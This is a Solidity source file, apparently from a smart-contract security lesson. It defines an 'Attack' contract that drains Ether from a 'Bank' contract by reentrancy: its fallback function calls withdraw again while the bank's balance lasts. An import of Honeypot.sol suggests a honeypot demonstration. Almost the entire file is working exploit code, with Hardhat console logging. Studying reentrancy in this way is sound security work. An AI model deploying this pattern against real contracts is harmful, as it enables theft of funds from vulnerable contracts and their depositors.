import "./Honeypot.sol";
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
// Hacker tries to drain the Ethers stored in Bank by reentrancy.
contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        console.log("receive eth");
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        console.log("start attack deposit",msg.value);
        bank.deposit{value: 1 ether}();
        console.log("start attack withdraw");
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}